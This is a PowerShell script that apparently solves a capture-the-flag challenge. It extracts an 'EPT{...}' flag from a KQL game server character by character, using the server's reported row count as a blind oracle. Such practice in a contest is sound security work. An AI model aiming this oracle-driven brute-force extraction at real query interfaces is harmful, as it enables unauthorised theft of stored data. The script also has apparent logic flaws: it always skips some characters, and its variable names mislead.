# Define the URLs
$startGameUrl = "https://kqlgame.ept.gg/start-game"
$gameUrl = "https://kqlgame.ept.gg/game"

# Function to check if a table name starts with a given prefix
function Check-TableNamePrefix {
    param (
        [string]$prefix
    )

    $query = "Users | where * startswith '$prefix' | where * endswith '}'"
    #$query = ".show tables | where TableName startswith '$prefix'"
    $formData = @{
        query = $query
    }

    # Convert form data to URL-encoded format
    $encodedFormData = [System.Web.HttpUtility]::ParseQueryString([string]::Empty)
    $formData.GetEnumerator() | ForEach-Object { $encodedFormData.Add($_.Key, $_.Value) }
    $encodedFormDataString = $encodedFormData.ToString()

    # Make the POST request
    $response = Invoke-RestMethod -Uri $gameUrl -Method Post -ContentType "application/x-www-form-urlencoded" -Body $encodedFormDataString

    # Extract the row count from the response
    if ($response -match '<h2>The row count for your query was (\d+) when it should have been 0\.</h2>') {
        return [int]$matches[1]
    } else {
        return 0
    }
}

# Check if the session started successfully
Write-Output "Session started successfully."

# Define the characters to iterate through
$characters = @('A'..'Z') + @('a'..'z') + @('0'..'9') + @('_', '{', '}')

# Initialize variables
$tableNames = @()
$currentPrefix =  "EPT{"
$runCount = 0
$firstRun = $true

# Loop to find table names
while ($true) {
    $found = $false
    foreach ($char in $characters) {
        if ($firstRun -and $char -eq 'B' -or ($char -eq 'D') -or ($char -eq 'E')) {
            continue
        }
        $prefix = $currentPrefix + $char
        Write-Output "Running query with prefix: $prefix"
        $rowCount = Check-TableNamePrefix -prefix $prefix
        Write-Output "Query result for prefix '$prefix': $rowCount rows"

        if ($rowCount -eq 1) {
            $currentPrefix = $prefix
            $found = $true
            break
        }
    }

    if (-not $found) {
        if ($currentPrefix -ne "") {
            $tableNames += $currentPrefix
            Write-Output "Table name: $currentPrefix"
            $currentPrefix = $currentPrefix.Substring(0, $currentPrefix.Length - 1)
        } else {
            break
        }
    }
    $runCount++
    $firstRun = $false
}
